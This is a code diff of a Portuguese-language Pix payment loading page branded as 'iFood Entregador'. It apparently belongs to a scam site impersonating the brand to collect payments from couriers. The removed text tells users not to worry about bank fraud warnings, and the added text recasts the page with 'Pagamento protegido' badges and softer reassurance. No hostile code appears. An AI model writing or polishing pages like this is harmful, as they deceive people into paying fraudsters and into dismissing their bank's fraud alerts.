@@ -10,6 +10,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.2">
+    <link rel="stylesheet" href="pix-loading.css?v=1">
 </head>
 <body data-page="pix-loading">
     <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
@@ -18,38 +19,48 @@
         <section class="step pix-loading-page" aria-hidden="false">
             <div class="pix-loading-brand">
                 <img src="assets/ifoodentregadores-wink-v1.svg" alt="iFood Entregador">
+                <span class="pix-loading-safe">
+                    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 4 5v6c0 5.1 3.4 9.8 8 11 4.6-1.2 8-5.9 8-11V5l-8-3Zm-1 14-3.5-3.5 1.4-1.4 2.1 2.1 4.6-4.6 1.4 1.4-6 6Z"/></svg>
+                    Pagamento protegido
+                </span>
             </div>
 
             <div class="pix-loading-card">
                 <div id="pix-loading-spinner" class="pix-loading-spinner" aria-hidden="true">
                     <span class="pix-loading-spinner-ring"></span>
+                    <span class="pix-loading-spinner-core">
+                        <svg viewBox="0 0 48 48"><path d="M17.4 9.5a9.3 9.3 0 0 1 13.2 0l7.9 7.9a9.3 9.3 0 0 1 0 13.2l-7.9 7.9a9.3 9.3 0 0 1-13.2 0l-7.9-7.9a9.3 9.3 0 0 1 0-13.2l7.9-7.9Zm10.9 2.4a6 6 0 0 0-8.6 0l-7.8 7.8a6 6 0 0 0 0 8.6l7.8 7.8a6 6 0 0 0 8.6 0l7.8-7.8a6 6 0 0 0 0-8.6l-7.8-7.8Z"/></svg>
+                    </span>
                     <span class="pix-loading-spinner-check"></span>
                 </div>
 
-                <span id="pix-loading-kicker" class="pix-loading-kicker" aria-live="polite">Pix sendo gerado</span>
-                <h1>Confira o nome antes de pagar</h1>
+                <span id="pix-loading-kicker" class="pix-loading-kicker" aria-live="polite">Preparando pagamento</span>
+                <h1>Seu Pix está quase pronto</h1>
                 <p class="pix-loading-copy">
-                    Seu banco pode mostrar um aviso de fraude ou seguranca antes do Pix. Isso e uma verificacao automatica. Confira o nome abaixo no aplicativo do banco e continue somente se o recebedor for o mesmo.
+                    Estamos organizando os dados do pedido para você pagar com segurança.
                 </p>
 
                 <div id="pix-loading-merchant-card" class="pix-loading-merchant">
-                    <span>O Pix deve aparecer neste nome</span>
-                    <strong id="pix-loading-merchant-name">-</strong>
+                    <span class="pix-loading-merchant-icon" aria-hidden="true">
+                        <svg viewBox="0 0 24 24"><path d="m9.2 16.6-4-4 1.4-1.4 2.6 2.6 8.2-8.2L18.8 7 9.2 16.6Z"/></svg>
+                    </span>
+                    <div>
+                        <span>Confira este nome no banco</span>
+                        <strong id="pix-loading-merchant-name">-</strong>
+                        <small>O recebedor precisa aparecer exatamente assim.</small>
+                    </div>
                 </div>
 
                 <div id="pix-loading-merchant-fallback" class="pix-loading-warning hidden">
-                    <strong>Confira os dados no app do banco</strong>
-                    <span>Antes de concluir, veja se o recebedor e o valor estao corretos.</span>
+                    <strong>Confira antes de pagar</strong>
+                    <span>Veja se o nome do recebedor e o valor estão corretos no aplicativo do banco.</span>
                 </div>
 
                 <div class="pix-loading-security">
+                    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 4 5v6c0 5.1 3.4 9.8 8 11 4.6-1.2 8-5.9 8-11V5l-8-3Zm0 17.9C8.7 18.8 6 15.2 6 11V6.4l6-2.3 6 2.3V11c0 4.2-2.7 7.8-6 8.9Z"/></svg>
                     <div>
-                        <strong>Se aparecer aviso de fraude</strong>
-                        <span>Nao se assuste. E uma camada extra do banco. Confira o nome do recebedor e o valor antes de seguir.</span>
-                    </div>
-                    <div>
-                        <strong>Quando estiver tudo certo</strong>
-                        <span>Toque no botao abaixo para abrir o Pix, copiar o codigo ou escanear o QR Code.</span>
+                        <strong>Antes de concluir</strong>
+                        <span>Confira o nome do recebedor e o valor. Alguns bancos podem exibir um aviso de segurança.</span>
                     </div>
                 </div>
 
@@ -60,8 +71,9 @@
                     </div>
                 </div>
 
-                <button id="btn-pix-loading-continue" class="btn-primary pix-loading-btn" type="button">
-                    Continuar
+                <button id="btn-pix-loading-continue" class="btn-primary pix-loading-btn hidden" type="button">
+                    <span>Abrir meu Pix</span>
+                    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="m13 5-1.4 1.4 4.6 4.6H5v2h11.2l-4.6 4.6L13 19l7-7-7-7Z"/></svg>
                 </button>
             </div>
         </section>
